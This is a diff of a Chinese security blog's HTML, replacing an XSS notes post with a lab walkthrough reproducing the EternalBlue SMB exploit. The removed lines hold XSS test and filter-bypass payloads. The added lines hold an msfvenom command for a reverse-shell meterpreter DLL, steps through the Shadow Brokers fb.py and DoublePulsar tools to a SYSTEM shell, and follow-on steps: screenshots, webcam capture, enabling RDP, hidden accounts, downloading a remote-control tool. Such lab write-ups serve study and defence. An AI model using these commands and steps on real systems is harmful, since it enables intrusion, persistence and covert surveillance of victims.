@@ -15,23 +15,26 @@
 
 
 
-<meta name="description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。">
+<meta name="description" content="影响版本12000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0 利用条件1.开启了445端口即可。2.大多数版本需要关闭防火">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS">
-<meta property="og:url" content="http://yoursite.com/2017/04/10/XSS/index.html">
+<meta property="og:title" content="方程式 Eternalblue 漏洞利用复现">
+<meta property="og:url" content="http://yoursite.com/2017/04/29/方程式 Eternalblue 漏洞利用复现/index.html">
 <meta property="og:site_name" content="大佬要我改个名">
-<meta property="og:description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。">
-<meta property="og:image" content="http://i.imgur.com/IaYq4Ao.png">
-<meta property="og:image" content="http://i.imgur.com/d67sv4O.png">
-<meta property="og:image" content="http://i.imgur.com/5xVlDW1.png">
-<meta property="og:image" content="http://i.imgur.com/4wY5s6k.png">
-<meta property="og:image" content="http://i.imgur.com/G6ZKw4k.png">
-<meta property="og:updated_time" content="2017-04-23T02:07:22.518Z">
+<meta property="og:description" content="影响版本12000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0 利用条件1.开启了445端口即可。2.大多数版本需要关闭防火">
+<meta property="og:image" content="http://i.imgur.com/wD2LNdg.png">
+<meta property="og:image" content="http://i.imgur.com/6qrYJwq.png">
+<meta property="og:image" content="http://i.imgur.com/nu4YPtO.png">
+<meta property="og:image" content="http://i.imgur.com/Gpv3SrA.png">
+<meta property="og:image" content="http://i.imgur.com/RAhw4yS.png">
+<meta property="og:image" content="http://i.imgur.com/G9AXXTu.png">
+<meta property="og:image" content="http://i.imgur.com/IbrCWwJ.png">
+<meta property="og:image" content="http://i.imgur.com/WxgakuR.png">
+<meta property="og:updated_time" content="2017-04-29T14:34:48.107Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS">
-<meta name="twitter:description" content="Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。DOM型：没怎么了解，后续了解了再补充。">
-<meta name="twitter:image" content="http://i.imgur.com/IaYq4Ao.png">
+<meta name="twitter:title" content="方程式 Eternalblue 漏洞利用复现">
+<meta name="twitter:description" content="影响版本12000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0 利用条件1.开启了445端口即可。2.大多数版本需要关闭防火">
+<meta name="twitter:image" content="http://i.imgur.com/wD2LNdg.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -63,7 +66,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>XSS | 大佬要我改个名</title>
+<title>方程式 Eternalblue 漏洞利用复现 | 大佬要我改个名</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -274,11 +277,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-方程式 Eternalblue 漏洞利用复现" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/04/10/XSS/" class="article-date">
-      <time datetime="2017-04-10T08:11:39.110Z" itemprop="datePublished">2017-04-10</time>
+      <a href="/2017/04/29/方程式 Eternalblue 漏洞利用复现/" class="article-date">
+      <time datetime="2017-04-29T13:28:48.815Z" itemprop="datePublished">2017-04-29</time>
 </a>
 
 
@@ -293,7 +296,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      XSS
+      方程式 Eternalblue 漏洞利用复现
     </h1>
   
 
@@ -310,25 +313,28 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Xss（CSS）：跨站脚本漏洞。分为存储型、反射型、DOM型。一般使用javascript语言编写（还有ActionScript/VBScrip等客户端脚本语言）。<br>反射型（非持久性）：不存储在服务器端，例如发送一个带有XSS的URL<br>存储型（持久性）：储存在服务器端，当用户访问带有XSS页面时，解析XSS代码。例如留言板。<br>DOM型：没怎么了解，后续了解了再补充。<br><a id="more"></a><br>javascript可以用来获取用户的Cookie、改变页面内容\URL跳转等。<br>Xss测试语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div><div class="line"><span class="string">"/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"</span>（闭合Input标签）</div><div class="line">‘”()%26%25&lt;acx&gt;&lt;ScRiPt &gt;alert(9528)&lt;/ScRiPt&gt;（大小写绕过）</div><div class="line"><span class="string">" onmouseover=alert(document.domain) align="</span>left（需移动鼠标）</div><div class="line"> “onclick=”alert(‘1’)      （需要点击框才弹）</div><div class="line"> &lt;img src=x onerror=alert(‘1’)&gt; </div><div class="line">&lt;body onload=alert(‘XSS’)&gt;</div><div class="line">...</div></pre></td></tr></table></figure></p>
+        <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0</div></pre></td></tr></table></figure>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.开启了445端口即可。<br>2.大多数版本需要关闭防火墙。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><p><a href="http://www.91ri.org/16946.html" target="_blank" rel="external">http://www.91ri.org/16946.html</a><br>(我看了半天愣是没看懂)<br>然后找了个比较简明的看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">首先SrvOs2FeaListToNt首先调用SrvOs2FeaListSizeToNt计算pNtFea的大小。这里注意了SrvOs2FeaListSizeToNt函数会修改原始的pOs2Fea中的Length大小,本来Length是一个DWORD, 代码还强制转换成了WORD,不能不让人联想一些事。然后以计算出来的Length来分配pNtFea.最后调用SrvOs2FeaToNt来实现转换。SrvOs2FeaToNt后面的判断就有问题了。这里还不止一个问题。 </div><div class="line">1. 转换完成后，增加pOs2FeaBody然后比较。正确的逻辑难道不应该是先判断再转换吗？ </div><div class="line">2. 由于SrvOs2FeaListSizeToNt中改变了pOs2Fea的length的值，这里使用变大后的值做比较，肯定会越界。</div></pre></td></tr></table></figure></p>
 <hr>
-<p>XSS例子:<br><img src="http://i.imgur.com/IaYq4Ao.png" alt=""><br>ARRAY_KEY_EXISTS():判断函数，如果name变量有值&amp;&amp;（与）不为空，则输出 “  Hello+&amp;_GET[‘name’]  “。<br><strong>思路：无过滤，直接XSS代码可执行。</strong></p>
-<hr>
-<p><img src="http://i.imgur.com/d67sv4O.png" alt=""><br>Str_replace():<br>判断是否存在<code>&lt;script&gt;</code>,存在则把<code>&lt;script&gt;</code>替换成空格，然后再把输入的东西传递给name变量。再输出。<br><strong>思路：运用不带有<code>&lt;script&gt;</code>的Javascript语言去运行XSS代码，或者把&lt; script&gt;大小写。</strong></p>
-<hr>
-<p><img src="http://i.imgur.com/5xVlDW1.png" alt=""><br>Prog_replace()：和楼上类似。不过是执行一个正则表达式的搜索和替换。比楼上的高级，它会对用户所有的有效输入字符进行匹配检查，并将无效字符替换为空。<br><strong>思路：还是和楼上一样，只不过是不能运用这<code>&lt;script&gt;</code>这些字符，大小也不可以。但是我们可以用其它标签，比如body标签、img标签等。</strong></p>
-<hr>
-<p><img src="http://i.imgur.com/4wY5s6k.png" alt=""><br>checkToken：用来检查session_token是否过期。<br>Htmlspecialchars()：把预定义字符（&amp;、”、&lt;、&gt;）转为HTML实体化的的函数（只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号）。</p>
-<p>**思路：1.因为没有过滤单引号，所以可以用 ‘onmouseover=alert’(1)’语句来弹窗，但是然并卵，，</p>
-<p>2.跳出Htmlspecialchars()函数重新赋值给$name，例POC：<br><img src="http://i.imgur.com/G6ZKw4k.png" alt=""><br>但还是不行，因为你在构造的时候就已经被实体化了，后面的语句根本无法有效运行。</p>
-<p>思路暂时没有，，等有想法再补充。</p>
-<hr>
-<p>XSS绕过：<br>1.利用空格或者回车<br>2.对标签属性进行编码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascrip&amp;<span class="comment">#116&amp;#58alert('xss')&gt;</span></div></pre></td></tr></table></figure></p>
-<p>3.大小写<br>4.用eval函数进行十六进制和十进制的编码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">"javascript:eval(string.formCharCode(97,98,99.....))"</span>&gt;</div></pre></td></tr></table></figure></p>
-<hr>
-<p>注：<br>1.输入的东西是否被转移，看源代码即可<br>2.对website有http-only、crossdomian.xml没有用<br>3.可以明面上输入&lt; “ &gt; ‘ 等字符测试，看源代码有哪些没被转义就用哪些。<br>4.需要大量测试（测试闭合标签）</p>
-<hr>
-<p>经典：<a href="http://www.freebuf.com/articles/web/40520.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/40520.html</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机：<br>Win7 旗舰版 x64 关闭防火墙 IP：192.168.26.129 开放445端口<br>攻击机A：<br>win7 旗舰版 x64 python2.6（32位）、对应的pywin32 IP :192.168.26.129<br>攻击机B：<br>kali2.0/任意安装了msf的Linux/可以被反弹获取后门权限的设备<br>这里我用的是kali2.0 IP:192.168.26.128</p>
+<p><strong>（没错，靶机和攻击机A是同一台，因为电脑配置渣，开不起第三台我就双向利用了。）</strong></p>
+<p>exp下载链接：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a> </p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>1.在攻击机A安装好<code>python-2.6.6.msi</code>，<code>pywin32-221.win32-py2.6.exe</code></p>
+<p>2.在攻击机B先生成一个payload。启动MSF。因为靶机为win7、X64位。<br>启动后对应的命令为:<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.26.128 LPORT=5555 -f dll &gt;test.dll</code><br>（注意创建的）</p>
+<p>3.把生成的payload传给攻击机A。</p>
+<p>4.打开EXP。即fb.py(现在根目录创建listeningposts文件，或者打开fb.py注释有关listeningposts的条目)</p>
+<p>输入：<br><img src="http://i.imgur.com/wD2LNdg.png" alt=""></p>
+<p>5.跳到fb后输入:<br><img src="http://i.imgur.com/6qrYJwq.png" alt=""></p>
+<p>6.一直回车确定，直到出现<br><img src="http://i.imgur.com/nu4YPtO.png" alt=""></p>
+<p>7.一直回车，直到出现如图，开始跳到Doublepulsar模块<br><img src="http://i.imgur.com/Gpv3SrA.png" alt=""></p>
+<p>8.一直回车，直到出现如图再选择：<br><img src="http://i.imgur.com/RAhw4yS.png" alt=""></p>
+<p>9.一直回车，直到出现<br><img src="http://i.imgur.com/G9AXXTu.png" alt=""></p>
+<p>10.返回攻击机A，查看msf,发现已成功反弹，执行shell命令。<br><img src="http://i.imgur.com/IbrCWwJ.png" alt=""></p>
+<p>11.成功得到System的权限并使用CMD命令进行相应操作。<br><img src="http://i.imgur.com/WxgakuR.png" alt=""></p>
+<h2 id="得到的反弹shell还可执行的其它操作"><a href="#得到的反弹shell还可执行的其它操作" class="headerlink" title="得到的反弹shell还可执行的其它操作"></a>得到的反弹shell还可执行的其它操作</h2><p>1.在第10步输入help，可查看此shell能执行的操作<br>screenshot  截图桌面<br>webcam_snap  拍照功能。</p>
+<p>。。。</p>
+<h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><p>利用命令开3389，并且创建隐藏账户<br>利用system权限远程下载一个远控</p>
 
       
     </div>
@@ -337,13 +343,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/04/10/XSS/">XSS</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/29/方程式 Eternalblue 漏洞利用复现/">方程式 Eternalblue 漏洞利用复现</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mark</a></p>
-        <p><span>发布时间:</span>2017-04-10, 16:11:39</p>
-        <p><span>最后更新:</span>2017-04-23, 10:07:22</p>
+        <p><span>发布时间:</span>2017-04-29, 21:28:48</p>
+        <p><span>最后更新:</span>2017-04-29, 22:34:48</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/04/10/XSS/" title="XSS">http://yoursite.com/2017/04/10/XSS/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/10/XSS/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/29/方程式 Eternalblue 漏洞利用复现/" title="方程式 Eternalblue 漏洞利用复现">http://yoursite.com/2017/04/29/方程式 Eternalblue 漏洞利用复现/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/29/方程式 Eternalblue 漏洞利用复现/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -356,17 +362,11 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/04/08/代码注入之XPath篇/">
-                    代码注入之XPath篇
+                <a href="/2017/04/26/提权/">
+                    提权技巧
                 </a>
             </div>
         
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/04/10/CSRF/">
-                    CSRF
-                </a>
-            </div>
         
     </nav>
 
@@ -376,7 +376,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-number">1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件"><span class="toc-number">2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">4.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现步骤"><span class="toc-number">5.</span> <span class="toc-text">复现步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#得到的反弹shell还可执行的其它操作"><span class="toc-number">6.</span> <span class="toc-text">得到的反弹shell还可执行的其它操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#隐藏"><span class="toc-number">7.</span> <span class="toc-text">隐藏</span></a></li></ol>
         
     </div>
     <style>
@@ -412,7 +412,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"XSS　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"方程式 Eternalblue 漏洞利用复现　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -432,7 +432,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/04/08/代码注入之XPath篇/" title="上一篇: 代码注入之XPath篇">
+            <a href="/2017/04/26/提权/" title="上一篇: 提权技巧">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -440,9 +440,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/04/10/CSRF/" title="下一篇: CSRF">
-                <i class="fa fa-angle-right"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
 
